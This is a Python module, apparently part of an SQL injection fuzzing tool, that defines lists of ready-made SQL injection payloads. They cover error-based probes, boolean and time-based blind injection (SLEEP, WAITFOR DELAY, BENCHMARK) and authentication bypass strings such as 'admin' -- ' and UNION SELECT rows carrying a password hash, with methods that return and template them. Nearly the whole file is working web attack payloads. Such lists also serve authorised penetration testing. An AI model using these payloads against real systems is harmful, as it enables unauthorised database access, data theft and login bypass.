#!/usr/bin/env python3
"""
Payload Generator module for the SQL Injection Fuzzer
"""


class PayloadGenerator:
    def __init__(self):
        self.error_based_payloads = []
        self.boolean_based_payloads = []
        self.time_based_payloads = []
        self.union_based_payloads = []
        self.authentication_bypass_payloads = []

        self._init_payloads()

    def _init_payloads(self):
        """Initialize the payload lists with common SQL injection payloads"""

        # Error-based payloads (MySQL specific)
        self.error_based_payloads = [
            "'",
            "\"",
            "`",
            "'))",
            "';",
            "\"",
            "\" OR \"\"=\"",
            "' OR ''='",
            "' OR 1=1 -- ",
            "\" OR 1=1 -- ",
            "' OR '1'='1",
            "' OR 1 -- ",
            "' OR 1/*",
            "\" OR \"1\"=\"1",
            "\" OR 1 -- ",
            "\" OR 1/*",
            "or 1=1",
            "or 1=1--",
            "or 1=1#",
            "or 1=1/*",
            "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
            "' AND 1=0 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--"
        ]

        # Boolean-based payloads
        self.boolean_based_payloads = [
            "' AND 1=1 -- ",
            "' AND 1=0 -- ",
            "' OR 1=1 -- ",
            "' OR 1=0 -- ",
            "' AND '1'='1",
            "' AND '1'='0",
            "' OR '1'='1",
            "' OR '1'='0",
            "1' AND 1=1 -- ",
            "1' AND 1=0 -- ",
            "1' OR 1=1 -- ",
            "1' OR 1=0 -- ",
            "1 AND 1=1 -- ",
            "1 AND 1=0 -- ",
            "1 OR 1=1 -- ",
            "1 OR 1=0 -- "
        ]

        # Time-based payloads (MySQL specific)
        self.time_based_payloads = [
            "' AND SLEEP(5) -- ",
            "\" AND SLEEP(5) -- ",
            "' OR SLEEP(5) -- ",
            "\" OR SLEEP(5) -- ",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
            "\" AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
            "\" OR (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
            "'; WAITFOR DELAY '0:0:5' -- ",
            "\"; WAITFOR DELAY '0:0:5' -- ",
            "' OR BENCHMARK(10000000,MD5(1)) -- ",
            "\" OR BENCHMARK(10000000,MD5(1)) -- "
        ]

        # Authentication bypass payloads
        self.authentication_bypass_payloads = [
            "admin' -- ",
            "admin' #",
            "admin'/*",
            "' OR 1=1 -- ",
            "' OR 1=1 #",
            "' OR 1=1/*",
            "admin' OR '1'='1",
            "admin' OR '1'='1' -- ",
            "admin' OR '1'='1' #",
            "admin'OR 1=1 OR ''='",
            "admin' OR 1=1",
            "admin' OR 1=1--",
            "admin' OR 1=1#",
            "admin' OR 1=1/*",
            "admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
        ]

    def generate_mysql_payloads(self):
        """
        Generate a list of MySQL-specific SQL injection payloads

        Returns:
            list: A list of SQL injection payloads
        """
        all_payloads = []

        # Combine all payload types
        all_payloads.extend(self.error_based_payloads)
        all_payloads.extend(self.boolean_based_payloads)
        all_payloads.extend(self.time_based_payloads)
        all_payloads.extend(self.authentication_bypass_payloads)

        # Remove duplicates while preserving order
        unique_payloads = []
        for payload in all_payloads:
            if payload not in unique_payloads:
                unique_payloads.append(payload)

        return unique_payloads

    def generate_custom_payloads(self, payload_template, values):
        """
        Generate custom payloads by substituting values into a template

        Args:
            payload_template (str): Template with placeholders
            values (list): List of values to substitute

        Returns:
            list: A list of customized payloads
        """
        custom_payloads = []

        for value in values:
            custom_payload = payload_template.replace("{}", str(value))
            custom_payloads.append(custom_payload)

        return custom_payloads

    def generate_error_based_payloads(self):
        """Get error-based payloads"""
        return self.error_based_payloads

    def generate_boolean_based_payloads(self):
        """Get boolean-based payloads"""
        return self.boolean_based_payloads

    def generate_time_based_payloads(self):
        """Get time-based payloads"""
        return self.time_based_payloads

    def generate_authentication_bypass_payloads(self):
        """Get authentication bypass payloads"""
        return self.authentication_bypass_payloads
